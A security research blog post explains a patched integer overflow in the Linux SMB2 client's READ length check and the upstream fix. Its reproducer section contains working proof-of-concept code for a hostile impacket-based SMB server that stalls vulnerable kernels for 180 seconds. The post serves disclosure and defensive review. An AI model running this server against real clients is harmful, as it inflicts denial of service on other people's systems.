---
title: "u32 + u32 = 0 is still a bug in 2026 — an SMB2 client integer overflow walkthrough"
date: 2026-06-01 18:00:00 -0500
categories: [Research, Linux Kernel]
tags: [linux-kernel, cifs, smb, smb2, integer-overflow, kasan, qemu, upstream, walkthrough]
toc: true
lang: en
description: >-
  An unguarded u32+u32 in the Linux cifs client lets a malicious SMB2 server
  trick the kernel into reading ~4 GiB from the TCP socket, stalling the
  connection for 180 seconds. Walkthrough of the code, the wire trigger, a
  KASAN-instrumented reproducer in QEMU, and the upstream fix. Patch landed in
  v7.1 and was AUTOSEL'd to stable. With a working PoC repo.
---

> **TL;DR** — `cifs_readv_receive()` and `handle_read_data()` both validate the SMB2 READ response with an unguarded `data_offset + data_len > buf_len`. Both fields are `u32` taken straight off the wire. A malicious server replying with `DataOffset = 0x50` and `DataLength = 0xFFFFFFB0` wraps the sum to `0`, the bound check passes, and the kernel walks straight into reading 4 GiB off the TCP socket. Fix: `check_add_overflow()` at both call sites. Patch is in mainline as `81a8742` and was AUTOSEL'd to stable on 2026-05-20. PoC: [`TREXNEGRO/research/tree/master/cifs-smb2-read-overflow`](https://github.com/TREXNEGRO/research/tree/master/cifs-smb2-read-overflow).
{: .prompt-tip }

## Setup

I want to talk about a small kernel bug. It's not flashy — nobody is going to write a Mandiant report about this one. But it's a textbook example of the bug class that defenders never quite finish chasing out of network-facing kernel code: an integer overflow in a length-validation check that comes straight from the wire. I'll walk through what the bug is, how the kernel ends up in a 180-second connection stall when a hostile server triggers it, what the upstream fix looks like, and how to reproduce it with a tiny `impacket`-based malicious server and a KASAN-instrumented QEMU.

The patch is upstream as commit `81a874233c305d29e37fdb70b691ff4254294c0b` ("smb: client: avoid integer overflow in SMB2 READ length check") and was picked up for stable by Sasha Levin on 2026-05-20. The thread is on [lore.kernel.org](https://lore.kernel.org/linux-cifs/20260514120334.2925013-1-mendozayt13@gmail.com/) if you want the original review traffic.

If you're already comfortable with the Linux cifs client and just want the bug, skip to **The bug** below. Otherwise the next two sections are 60 seconds of context.

## The Linux SMB client in 90 seconds

When a Linux host mounts an SMB share — `mount.cifs //server/share /mnt` — the heavy lifting happens in `fs/smb/client/` inside the kernel. It's an SMB1/2/3 client, called `cifs.ko` for historical reasons (the original code targeted CIFS, the protocol formerly known as SMB1). All the wire formats and bound checks live in C, and the receive path is a kernel thread per TCP session.

There are two places we care about today. Both take a freshly-received SMB2 READ response off the socket and decide how many bytes the server claims are in the payload. Both are reachable from any cifs mount. The first is in `fs/smb/client/transport.c`, on the "lots of data, read into the netfs subrequest iterator" path:

```c
/* fs/smb/client/transport.c — receive_encrypted_read() / cifs_readv_receive() */

int cifs_readv_receive(struct TCP_Server_Info *server, struct mid_q_entry *mid)
{
    int  length;
    int  len;
    char *buf      = server->smallbuf;
    struct smb2_hdr *shdr = (struct smb2_hdr *)buf;
    unsigned int data_offset, data_len, remaining, len_remaining;
    struct cifs_io_subrequest *rdata = mid->callback_data;
    ...
}
```

The second is in `fs/smb/client/smb2ops.c`, inside `handle_read_data()`, called from the offloaded receive path (the one that runs on a worker thread after the transform PDU has been decrypted for SMB3 sessions):

```c
/* fs/smb/client/smb2ops.c — handle_read_data() */

static int handle_read_data(struct TCP_Server_Info *server,
                            struct mid_q_entry *mid,
                            char *buf, unsigned int buf_len,
                            struct smb2_sync_hdr *shdr, ...)
{
    unsigned int data_offset;
    unsigned int data_len;
    ...
}
```

Both functions decode the same SMB2 READ response fields. Both apply the same kind of bound check. Both had the same bug. The fix is the same shape in both places — that's the only reason I'm pulling on this thread instead of declaring it a one-liner and moving on.

## SMB2 READ response, on the wire

The structure of an SMB2 READ response from `[MS-SMB2] §2.2.20` is friendly enough:

```text
SMB2 READ Response (header omitted)
    StructureSize (2)        = 17
    DataOffset    (1)        = offset, in bytes from start of SMB2 header
    Reserved      (1)        = 0
    DataLength    (4)        = number of bytes in the Data buffer
    DataRemaining (4)        = bytes left in the file after this READ
    Reserved2     (4)        = 0
    Data          (variable) = the actual READ payload
```

`DataOffset` is a `u8` (so already constrained to ≤ 255) but the kernel widens it to `unsigned int data_offset = le16_to_cpu(...)` for downstream arithmetic. `DataLength` is a `u32`, attacker-controlled, no upper-bound enforcement in the protocol other than what the kernel itself decides to enforce.

Now the question every kernel reviewer with a couple of network-facing bugs in their past asks: when we see `data_offset + data_len`, what's the type of that expression, and what's the type of the value we compare it against?

## The bug

Here's the unpatched check in `transport.c` (lines ~1257-1260 in the pre-patch tree):

```c
data_offset = server->vals->read_rsp_size;
data_len    = le32_to_cpu(shdr->DataLength);

if (!use_rdma_mr && (data_offset + data_len > buflen))
    return -1;
```

`data_offset` is `unsigned int`. `data_len` is `unsigned int`. `buflen` is `unsigned int`. The sum is computed in `unsigned int` — which on x86-64 Linux is 32 bits — and modular arithmetic kicks in at `2^32`. If `data_len` is a hair under `UINT_MAX`, the sum wraps around and lands somewhere below `buflen`. The check passes.

The same shape is in `smb2ops.c`, inside `handle_read_data()` at line ~4839:

```c
} else if (buf_len >= data_offset + data_len) {
    /* read response payload is in buf */
    WARN_ONCE(buffer, "read data can be either in buf or in buffer");
    copied = copy_to_iter(buf + data_offset, data_len, &rdata->subreq.io_iter);
    ...
}
```

Different sign of the comparison (`>=` instead of `>`) but same defect: `data_offset + data_len` is computed unsigned and can wrap.

If you ask me to put a single sentence on why this exists in 2026: integer overflow on a `+` is the easiest UB to forget about, because you write the check the way you read it in your head ("offset plus length should not exceed buffer"), and the compiler is happy to compile that literally without warning. The protocol doesn't help — `DataLength` is 32 bits in the spec and the kernel mirrors the spec — and the rest of `cifs/` already uses `check_add_overflow()` in several places, so this is just two sites that nobody had walked into yet.

## What numbers actually wrap

Concrete example. The size of an SMB2 READ response header is 80 bytes (`smb2_read_rsp` struct, `0x50`). The maximum `buflen` for a small receive buffer in cifs is somewhere in the low hundreds depending on what you mounted. Let's pick a malicious value that demonstrates the issue:

- `DataOffset = 0x50` (80) — legitimate, points exactly to the byte after the SMB2 READ response header.
- `DataLength = 0xFFFFFFB0` (4,294,967,216 — `UINT_MAX - 79`).

Then:

```text
data_offset + data_len = 0x00000050 + 0xFFFFFFB0 = 0x100000000 → wraps to 0x00000000
                                                              = 0   (in unsigned int)
```

The check is `0 > buflen`. False. Bound check passes. The kernel now believes the response carries `data_len = 0xFFFFFFB0` bytes — about 4 GiB — and proceeds to ask for them.

## What happens downstream

On the `transport.c` path, the kernel calls `cifs_read_iter_from_socket()` to consume those bytes off the TCP socket. The receive thread blocks waiting for ~4 GiB of bytes that the attacker has no intention of sending. The session response timeout for cifs is **180 seconds**. After 180 s, the kernel gives up and reconnects:

```text
[ 60.940]  smb2_async_readv: offset=0 bytes=4096
[ 60.945]  cifs_readv_receive: mid=23 offset=0 bytes=4096
[ 60.947]  cifs_readv_receive: total_read=80 data_offset=80
[ 61.098]  …  silence  …
[242.760]  CIFS: VFS: \\10.0.2.2 has not responded in 180 seconds. Reconnecting...
[242.802]  CIFS: fs/smb/client/transport.c:
           total_read=4294967273  buflen=144  remaining=4294967216
[244.5  ]  smb2_readv_callback: mid=23 state=8 result=0 bytes=0/4096
```

The smoking-gun line is the one at `242.802`. `remaining = 0xFFFFFFB0 = 4,294,967,216` is exactly the attacker-supplied `DataLength`. The kernel got there by trusting the bound check that just wrapped around it.

On the `smb2ops.c` path, the kernel goes one step further and calls `copy_to_iter(buf + data_offset, data_len, iter)` with `data_len` being the attacker's 4 GiB. That path is reachable only through the encrypted/compounded receive path, which my QEMU lab doesn't currently exercise end-to-end. But the bound check has the same defect and the downstream copy has the same attacker control over its length argument. Linux's usercopy hardening (`__check_heap_object()`, `include/linux/ucopysize.h:57`) catches the oversized copy at runtime before bytes reach userspace — so this isn't a clean read primitive in the offloaded path either — but counting on usercopy hardening to save you from a missing bound check is not a defense, it's a coincidence.

## The fix

The fix is the boring, correct one: stop computing the sum in plain unsigned arithmetic. Use `check_add_overflow()` from `include/linux/overflow.h`, which already lives in this subsystem (e.g. `smb2pdu.c`).

Two hunks. Here's the `smb2ops.c` one, in `handle_read_data()`:

```diff
@@ -4721,6 +4721,7 @@ handle_read_data(struct TCP_Server_Info *server, struct mid_q_entry *mid,
 {
     unsigned int data_offset;
     unsigned int data_len;
+    unsigned int end_off;
     unsigned int cur_off;
     unsigned int cur_page_idx;
     unsigned int pad_len;
@@ -4836,7 +4837,8 @@ handle_read_data(struct TCP_Server_Info *server, struct mid_q_entry *mid,
         }
         rdata->got_bytes = buffer_len;

-    } else if (buf_len >= data_offset + data_len) {
+    } else if (!check_add_overflow(data_offset, data_len, &end_off) &&
+           buf_len >= end_off) {
         /* read response payload is in buf */
         WARN_ONCE(buffer, "read data can be either in buf or in buffer");
         copied = copy_to_iter(buf + data_offset, data_len, &rdata->subreq.io_iter);
```

`check_add_overflow(a, b, dst)` writes `a + b` into `*dst` and returns `true` if the sum overflowed. On overflow, we treat the response as malformed and fall out of the bound check; the existing error path discards the response and the session continues.

The `transport.c` hunk is the same idea applied to `cifs_readv_receive()`:

```diff
@@ fs/smb/client/transport.c, cifs_readv_receive()
-    if (!use_rdma_mr && (data_offset + data_len > buflen))
-        return -1;
+    unsigned int end_off;
+    if (!use_rdma_mr) {
+        if (check_add_overflow(data_offset, data_len, &end_off))
+            return -1;
+        if (end_off > buflen)
+            return -1;
+    }
```

Two lines per call site. Three real changes to the source tree, including the new `unsigned int end_off` declarations. No semantic change for well-formed servers (where the sum doesn't overflow) — the check produces the same result for any value pair that wouldn't have wrapped.

A reasonable hardening exercise after this lands is to grep the rest of `fs/smb/` for the pattern `(\w+) + (\w+) > \w+` where all three are wire-derived unsigned ints. There are a handful of similar checks; most are fine because at least one of the operands is bounded by an upstream check, but it's the kind of audit that scales linearly with reviewer attention. The patch I'm describing here is two of those that weren't bounded.

## A reproducer in 60 lines

The PoC is a minimal hostile SMB2 server based on `impacket.smbserver.SimpleSMBServer`. It accepts the negotiate / session-setup / tree-connect / create flow normally (using impacket's known-good handlers) and then monkey-patches the SMB2 READ handler to emit our malicious response with `DataOffset = 0x50` and `DataLength = 0xFFFFFFB0`.

The skeleton, with comments where the actual `impacket` API names live:

```python
# malicious_server.py — minimal cifs READ-overflow PoC
# Authorized testing / research only. Requires impacket >= 0.11.

import struct
from impacket.smbserver import SimpleSMBServer, SMB2Commands

# The wire-level malformed SMB2 READ response that triggers the bug.
# Header fields are filled by impacket; this is just the body.
def craft_overflow_read_response():
    # SMB2 READ Response body layout:
    #   StructureSize  u16 = 17
    #   DataOffset     u8  = 0x50   (legitimate: just past the response header)
    #   Reserved       u8  = 0
    #   DataLength     u32 = 0xFFFFFFB0   ← the malicious one
    #   DataRemaining  u32 = 0
    #   Reserved2      u32 = 0
    #   Buffer         var = b''    (we send no actual data; the client will block)
    return struct.pack(
        '<H B B I I I',
        17,            # StructureSize
        0x50,          # DataOffset
        0,             # Reserved
        0xFFFFFFB0,    # DataLength  ← UINT_MAX - 79
        0,             # DataRemaining
        0,             # Reserved2
    )

# Monkey-patch the existing SMB2_READ handler so every READ gets the bad body.
original_read = SMB2Commands.smb2Read
def malicious_smb2Read(self, connId, smbServer, recvPacket):
    # Build the response packet using impacket's helpers, then swap the body.
    resp_packet = original_read(self, connId, smbServer, recvPacket)
    if isinstance(resp_packet, tuple) and len(resp_packet) >= 1:
        full   = resp_packet[0]
        header = full[:64]                      # SMB2 header is 64 bytes
        return (header + craft_overflow_read_response(),) + resp_packet[1:]
    return resp_packet
SMB2Commands.smb2Read = malicious_smb2Read

# Stand up a server on 0.0.0.0:1445 with a single share.
server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=1445)
server.addShare('SHARE', '/tmp', 'malicious share')
server.setSMB2Support(True)
server.setSMBChallenge('')             # accept any guest
server.start()
```

That's enough to trigger the vulnerable path on a stock unpatched kernel. The real version in the repo handles connection teardown cleanly and logs the request stream to make the reproducer comfortable to re-run, but the core trick is just the body swap.

## Running it under QEMU + KASAN

I drove this against a `linux-v7.0` tag built with `KASAN_GENERIC + KASAN_OUTLINE + FORTIFY_SOURCE + CIFS=y`. QEMU TCG (no `/dev/kvm` needed), 1 GB RAM, 2 vCPU. SLIRP networking routes guest `10.0.2.2` to the host loopback, so a Python server bound to `0.0.0.0:1445` on the host serves the guest's `mount.cifs` traffic.

```bash
# 1) start the malicious server on the host
python3 malicious_server.py
# → listening on 0.0.0.0:1445

# 2) in another terminal, boot the test kernel
qemu-system-x86_64 \
    -kernel arch/x86/boot/bzImage \
    -initrd initrd.cpio.gz \
    -append 'console=ttyS0 panic=1 oops=panic kasan_multi_shot loglevel=8' \
    -nographic -m 1G -smp 2 \
    -net nic,model=virtio -net user,hostfwd=tcp::1445-:1445

# 3) init script inside the guest runs:
ifconfig eth0 10.0.2.15
mount.cifs //10.0.2.2/SHARE /mnt \
    -o sec=ntlmssp,vers=2.0,user=guest,password=,rsize=65536,port=1445
dd if=/mnt/file of=/tmp/leak bs=4096 count=1
```

On the vulnerable kernel the `dd` blocks. The receive thread is sitting in `cifs_read_iter_from_socket()` waiting for the 4 GiB the malicious server claimed it would send. After 180 seconds the kernel gives up and prints the `has not responded in 180 seconds` line, followed by the smoking gun: `total_read=4294967273 buflen=144 remaining=4294967216`.

On the patched kernel the same harness completes in about 66 seconds — boot, mount, `dd`, clean shutdown — because `check_add_overflow()` rejects the malformed frame before the receive thread asks for any of those bytes.

I ran this side-by-side three times each (vulnerable / patched, same kernel source tree, same QEMU command, only the two-hunk patch as the difference). The shape was deterministic — vulnerable always stalled at the `180 s` mark; patched always cleaned up around `66 s`.

## What was the actual reachability story

There are two related questions: "can the bug be triggered" and "what does triggering it buy an attacker". Triggering only requires being able to act as the SMB server — i.e. a malicious server, or a man-in-the-middle on the SMB session, or a redirect to one. That's not nothing — corporate networks often have unauthenticated cifs traffic moving between hosts and SMB MitM is a real attack class with documented tools — but it's also not "any internet attacker".

The blast radius is the more interesting half. On the `transport.c` site, the immediate consequence is the kernel-side stall + 180-second connection drop. That's a denial of service against any cifs mount that touches the malicious server. Not glamorous, but real, and a reliable one — the bug is data-driven, not timing-dependent, and the malicious server has full control over when to fire it (per READ, per share, per session).

On the `smb2ops.c` site, the immediate consequence is `copy_to_iter(buf + data_offset, data_len, iter)` with attacker-controlled `data_len`. This is the more interesting half because the copy targets a netfs subrequest iterator that bridges into user space. The Linux usercopy hardening path catches the oversized copy at `__check_heap_object()` before bytes reach userspace, which is good — but the bound check that should have caught it earlier was the broken one. Calling that "fine because hardening catches it" is the wrong framing.

I'd put this at "high-quality DoS with secondary read concerns" — not a clean R/W primitive, not a critical-and-everything-burns finding. But the kind of bug a kernel maintainer wants gone from a network-facing receive path regardless.

## Upstream timeline, for the curious

The mainline path was the usual: patch posted to `Steve French <sfrench@samba.org>` with `linux-cifs@vger.kernel.org` Cc'd on `2026-05-11`; review on the cifs list; merged on `2026-05-13`; mainline commit `81a874233c305d29e37fdb70b691ff4254294c0b` (`smb: client: avoid integer overflow in SMB2 READ length check`). Sasha Levin AUTOSEL'd it for stable on `2026-05-20` ([linked thread](https://lore.kernel.org/stable/20260520111944.3424570-10-sashal@kernel.org/)), which means it'll filter into the stable trees on the next stable cut.

That's the entire wall-clock for this one. `~9 days` from first send to AUTOSEL pickup. Steve's review on cifs is fast when the patch is small and the reasoning is clear, which is exactly the kind of patch this is.

## Follow-up work in flight

While we were in this neighbourhood, a couple of related improvements landed in flight upstream addressing a different aspect of the same receive path — specifically the bookkeeping of bytes copied during the encrypted compound receive. Those are still under review on the cifs list and I'll write them up properly once they settle. The shape will be similar: small patches, exact reasoning, focused on the same `fs/smb/client/smb2ops.c` neighbourhood.

If you're curious about the trajectory, the cifs list archive at `https://lore.kernel.org/linux-cifs/` is the canonical place. The patches show up there with the same kind of name shape.

## Methodology callout

A few things made this one catchable that are worth naming so future reviewers can do the same:

1. **Walk every `+ > buf` check on wire-derived ints.** It's a small set per subsystem and `grep` does most of the work. The Linux source has helpers for this — `check_add_overflow()`, `size_add()`, `array_size()` — and the existence of those helpers in the same subsystem is the strongest signal that the call site you're looking at is supposed to use one.
2. **Use the protocol's largest legal field width to derive your malicious value.** `DataLength` is 32 bits. The malicious value is "just under `UINT_MAX`, chosen so the wrap lands in the safe-looking zone of the bound check." There's no creativity required — the protocol's own type system tells you the search space.
3. **Reproduce with a malicious server, not a fuzzer.** Fuzzers find this class of bug occasionally but the search space is `2^32` for the length alone and the time-to-first-stall is dominated by the 180 second timeout. A hand-crafted reproducer hits the bug deterministically and gives you the timeline you need to debug downstream behaviour.
4. **KASAN doesn't catch everything you'd want it to.** This bug doesn't produce a clean KASAN slab-out-of-bounds at the upstream site because `cifs_read_iter_from_socket()` reads into a user-supplied iterator, not a kernel slab. The signal is the 180-second stall and the `remaining=...` log line, not a `BUG: KASAN:` banner. If you're driving an audit by waiting for KASAN bangs you'll miss this whole class.

## PoC repo

The full reproducer — malicious server, QEMU init scripts, KASAN trace samples, side-by-side vulnerable/patched logs — is at:

→ **[github.com/TREXNEGRO/research/tree/master/cifs-smb2-read-overflow](https://github.com/TREXNEGRO/research/tree/master/cifs-smb2-read-overflow)**

License is MIT. The repo includes:

- `server/malicious_server.py` — the impacket-based hostile server.
- `lab/init.sh`, `lab/run-vulnerable.sh`, `lab/run-patched.sh` — QEMU lifters.
- `logs/KASAN-vulnerable.log`, `logs/patched.log` — the two side-by-side traces (redacted build identifiers).
- `README.md` — wire-level explanation, kernel build steps, expected outputs.

## References

1. Upstream commit `81a874233c305d29e37fdb70b691ff4254294c0b` — "smb: client: avoid integer overflow in SMB2 READ length check". Linux v7.1.
2. Patch thread on lore.kernel.org: <https://lore.kernel.org/linux-cifs/20260514120334.2925013-1-mendozayt13@gmail.com/>
3. AUTOSEL pickup for stable: <https://lore.kernel.org/stable/20260520111944.3424570-10-sashal@kernel.org/>
4. `[MS-SMB2] §2.2.20` — SMB2 READ Response wire format.
5. `include/linux/overflow.h` — `check_add_overflow()` and friends.
6. `include/linux/ucopysize.h:57` — `__check_heap_object()`, the usercopy hardening fallback that accidentally catches the offloaded-path version of this bug.

---

*If you reproduce this with the PoC and the timing or symptoms differ from what's written here, open an issue on the PoC repo — happy to compare notes. If you find a sibling overflow in the same neighbourhood and want a sanity-check before sending it upstream, also happy to look. The two-hunk patch shape generalises easily and there are more of these sleeping in network-facing kernel code than there should be.*
